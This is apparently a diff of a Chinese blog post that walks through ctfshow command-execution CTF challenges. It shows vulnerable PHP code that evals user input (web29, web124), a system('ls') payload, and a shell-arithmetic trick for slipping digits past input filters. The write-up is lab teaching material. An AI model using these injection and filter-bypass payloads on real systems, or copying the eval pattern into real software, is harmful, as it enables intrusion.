href="#web40"><span class="nav-number">12.</span> <span class="nav-text">web40</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web41"><span class="nav-number">13.</span> <span class="nav-text">web41</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DRCE"><span class="nav-number">13.1.</span> <span class="nav-text">#无数字字母RCE</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web42"><span class="nav-number">14.</span> <span class="nav-text">web42</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web43"><span class="nav-number">15.</span> <span class="nav-text">web43</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux%E5%91%BD%E4%BB%A4%E8%BF%9E%E6%8E%A5%E7%AC%A6"><span class="nav-number">15.1.</span> <span class="nav-text">Linux命令连接符&amp;&amp;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux%E5%91%BD%E4%BB%A4%E8%BF%9E%E6%8E%A5%E7%AC%A6-1"><span class="nav-number">15.2.</span> <span class="nav-text">Linux命令连接符||</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux%E5%91%BD%E4%BB%A4%E8%BF%9E%E6%8E%A5%E7%AC%A6-2"><span class="nav-number">15.3.</span> <span class="nav-text">Linux命令连接符|</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web44"><span class="nav-number">16.</span> <span class="nav-text">web44</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web45"><span class="nav-number">17.</span> <span class="nav-text">web45</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web46"><span class="nav-number">18.</span> <span class="nav-text">web46</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web47"><span class="nav-number">19.</span> <span class="nav-text">web47</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web48"><span class="nav-number">20.</span> <span class="nav-text">web48</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web49"><span class="nav-number">21.</span> <span class="nav-text">web49</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web50"><span class="nav-number">22.</span> <span class="nav-text">web50</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web51"><span class="nav-number">23.</span> <span class="nav-text">web51</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web52"><span class="nav-number">24.</span> <span class="nav-text">web52</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web53"><span class="nav-number">25.</span> <span class="nav-text">web53</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web54"><span class="nav-number">26.</span> <span class="nav-text">web54</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web55"><span class="nav-number">27.</span> <span class="nav-text">web55</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web56"><span class="nav-number">28.</span> <span class="nav-text">web56</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web57"><span class="nav-number">29.</span> <span class="nav-text">web57</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web58-65"><span class="nav-number">30.</span> <span class="nav-text">web58-65</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web66-67"><span class="nav-number">31.</span> <span class="nav-text">web66-67</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web68"><span class="nav-number">32.</span> <span class="nav-text">web68</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BE%93%E5%87%BA%E6%95%B0%E7%BB%84%E5%87%BD%E6%95%B0%E4%BB%A3%E6%9B%BF1"><span class="nav-number">32.1.</span> <span class="nav-text">#输出数组函数代替1</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web69-70"><span class="nav-number">33.</span> <span class="nav-text">web69-70</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BE%93%E5%87%BA%E6%95%B0%E7%BB%84%E5%87%BD%E6%95%B0%E4%BB%A3%E6%9B%BF2"><span class="nav-number">33.1.</span> <span class="nav-text">#输出数组函数代替2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#json-encode-%E5%87%BD%E6%95%B0"><span class="nav-number">33.2.</span> <span class="nav-text">json_encode()函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#var-export-%E5%87%BD%E6%95%B0"><span class="nav-number">33.3.</span> <span class="nav-text">var_export()函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web71"><span class="nav-number">34.</span> <span class="nav-text">web71</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E5%89%8D%E9%80%81%E5%87%BA%E7%BC%93%E5%86%B2%E5%8C%BA"><span class="nav-number">34.1.</span> <span class="nav-text">提前送出缓冲区</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E7%BC%93%E5%86%B2%E5%8C%BA"><span class="nav-number">34.2.</span> <span class="nav-text">绕过缓冲区</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web72"><span class="nav-number">35.</span> <span class="nav-text">web72</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#glob%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87%E7%9B%AE%E5%BD%95%E8%AE%BF%E9%97%AE%E9%99%90%E5%88%B6"><span class="nav-number">35.1.</span> <span class="nav-text">#glob协议绕过目录访问限制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#UAF%E8%84%9A%E6%9C%AC"><span class="nav-number">35.2.</span> <span class="nav-text">UAF脚本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web73"><span class="nav-number">36.</span> <span class="nav-text">web73</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web74"><span class="nav-number">37.</span> <span class="nav-text">web74</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web75-76"><span class="nav-number">38.</span> <span class="nav-text">web75-76</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web77"><span class="nav-number">39.</span> <span class="nav-text">web77</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web118"><span class="nav-number">40.</span> <span class="nav-text">web118</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%AE%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8FRCE"><span class="nav-number">40.1.</span> <span class="nav-text">#内置环境变量RCE</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web119"><span class="nav-number">41.</span> <span class="nav-text">web119</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web120"><span class="nav-number">42.</span> <span class="nav-text">web120</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web121"><span class="nav-number">43.</span> <span class="nav-text">web121</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web122"><span class="nav-number">44.</span> <span class="nav-text">web122</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web124"><span class="nav-number">45.</span> <span class="nav-text">web124</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="wanTh3flag"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">wanTh3flag</p>
+  <div class="site-description" itemprop="description">一条有梦想的咸鱼</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">160</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">27</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">117</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="/2323277194" title="qq → 2323277194" rel="noopener me"><i class="fab fa-qq fa-fw"></i>qq</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://wanth3f1ag.top/2025/06/29/ctfshow%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="wanTh3flag">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="root@wanth3f1ag">
+      <meta itemprop="description" content="一条有梦想的咸鱼">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="ctfshow入门命令执行 | root@wanth3f1ag">
+      <meta itemprop="description" content="ctfshow入门命令执行">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ctfshow入门命令执行
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-06-29 17:20:28" itemprop="dateCreated datePublished" datetime="2025-06-29T17:20:28+08:00">2025-06-29</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-12-01 19:20:50" itemprop="dateModified" datetime="2025-12-01T19:20:50+08:00">2025-12-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctfshow/" itemprop="url" rel="index"><span itemprop="name">ctfshow</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>46k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>42 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">ctfshow入门命令执行</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:26:48</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>先看看目录</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>);</span><br></pre></td></tr></table></figure>
@@ -375,7 +519,7 @@
 
 <p>这里的话很明显是需要构造一个36出来</p>
 <p><strong>在linux中</strong>，<code>$(())</code>表示进行运算的意思</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@VM-16-12-ubuntu:/home/ubuntu# echo $(())</span><br><span class="line">0</span><br><span class="line">root@VM-16-12-ubuntu:/home/ubuntu# echo $((~$(())))</span><br><span class="line">-1</span><br><span class="line">root@VM-16-12-ubuntu:/home/ubuntu# echo $(($((~$(())))$((~$(())))$((~$(())))))</span><br><span class="line">-3</span><br><span class="line">root@VM-16-12-ubuntu:/home/ubuntu# echo $((~$(($((~$(())))$((~$(())))$((~$(())))))))</span><br><span class="line">2</span><br></pre></td></tr></table></figure>
+<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@VM<span class="number">-16</span><span class="number">-12</span>-ubuntu:/home/ubuntu# echo $(())</span><br><span class="line"><span class="number">0</span></span><br><span class="line">root@VM<span class="number">-16</span><span class="number">-12</span>-ubuntu:/home/ubuntu# echo $((~$(())))</span><br><span class="line"><span class="number">-1</span></span><br><span class="line">root@VM<span class="number">-16</span><span class="number">-12</span>-ubuntu:/home/ubuntu# echo $(($((~$(())))$((~$(())))$((~$(())))))</span><br><span class="line"><span class="number">-3</span></span><br><span class="line">root@VM<span class="number">-16</span><span class="number">-12</span>-ubuntu:/home/ubuntu# echo $((~$(($((~$(())))$((~$(())))$((~$(())))))))</span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure>
 
 <p>中间37个<code>$((~$(())))</code>就是<code>-37</code>，取反后就是<code>36</code></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@VM-<span class="number">16</span>-<span class="number">12</span>-ubuntu:/home/ubuntu<span class="comment"># echo $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span></span><br><span class="line"><span class="number">36</span></span><br></pre></td></tr></table></figure>
@@ -556,164 +700,117 @@
 <h2 id="web124"><a href="#web124" class="headerlink" title="web124"></a>web124</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 收集自网络</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-06 14:04:45</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 
-  </div>
-</article>
-
-
-
-        
-          <div id="footer-post-container">
-  <div id="footer-post">
-
-    <div id="nav-footer" style="display: none">
-      <ul>
-        
-          <li><a href="/">H0me</a></li>
-        
-          <li><a href="/about/">A6out</a></li>
-        
-          <li><a href="/tags/">T6gs</a></li>
-        
-          <li><a href="/categories/">Catagory</a></li>
-        
-          <li><a href="/links/">L1nks</a></li>
-        
-          <li><a href="/search/">s4arch</a></li>
-        
-      </ul>
     </div>
 
     
     
-      <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web29"><span class="toc-number">1.</span> <span class="toc-text">web29</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web30"><span class="toc-number">2.</span> <span class="toc-text">web30</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web31"><span class="toc-number">3.</span> <span class="toc-text">web31</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web32"><span class="toc-number">4.</span> <span class="toc-text">web32</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web33"><span class="toc-number">5.</span> <span class="toc-text">web33</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web34"><span class="toc-number">6.</span> <span class="toc-text">web34</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web35"><span class="toc-number">7.</span> <span class="toc-text">web35</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web36"><span class="toc-number">8.</span> <span class="toc-text">web36</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web37"><span class="toc-number">9.</span> <span class="toc-text">web37</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web38"><span class="toc-number">10.</span> <span class="toc-text">web38</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web39"><span class="toc-number">11.</span> <span class="toc-text">web39</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web40"><span class="toc-number">12.</span> <span class="toc-text">web40</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web41"><span class="toc-number">13.</span> <span class="toc-text">web41</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DRCE"><span class="toc-number">13.1.</span> <span class="toc-text">#无数字字母RCE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web42"><span class="toc-number">14.</span> <span class="toc-text">web42</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web43"><span class="toc-number">15.</span> <span class="toc-text">web43</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E5%91%BD%E4%BB%A4%E8%BF%9E%E6%8E%A5%E7%AC%A6"><span class="toc-number">15.1.</span> <span class="toc-text">Linux命令连接符&amp;&amp;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E5%91%BD%E4%BB%A4%E8%BF%9E%E6%8E%A5%E7%AC%A6-1"><span class="toc-number">15.2.</span> <span class="toc-text">Linux命令连接符||</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E5%91%BD%E4%BB%A4%E8%BF%9E%E6%8E%A5%E7%AC%A6-2"><span class="toc-number">15.3.</span> <span class="toc-text">Linux命令连接符|</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web44"><span class="toc-number">16.</span> <span class="toc-text">web44</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web45"><span class="toc-number">17.</span> <span class="toc-text">web45</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web46"><span class="toc-number">18.</span> <span class="toc-text">web46</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web47"><span class="toc-number">19.</span> <span class="toc-text">web47</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web48"><span class="toc-number">20.</span> <span class="toc-text">web48</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web49"><span class="toc-number">21.</span> <span class="toc-text">web49</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web50"><span class="toc-number">22.</span> <span class="toc-text">web50</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web51"><span class="toc-number">23.</span> <span class="toc-text">web51</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web52"><span class="toc-number">24.</span> <span class="toc-text">web52</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web53"><span class="toc-number">25.</span> <span class="toc-text">web53</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web54"><span class="toc-number">26.</span> <span class="toc-text">web54</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web55"><span class="toc-number">27.</span> <span class="toc-text">web55</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web56"><span class="toc-number">28.</span> <span class="toc-text">web56</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web57"><span class="toc-number">29.</span> <span class="toc-text">web57</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web58-65"><span class="toc-number">30.</span> <span class="toc-text">web58-65</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web66-67"><span class="toc-number">31.</span> <span class="toc-text">web66-67</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web68"><span class="toc-number">32.</span> <span class="toc-text">web68</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%93%E5%87%BA%E6%95%B0%E7%BB%84%E5%87%BD%E6%95%B0%E4%BB%A3%E6%9B%BF1"><span 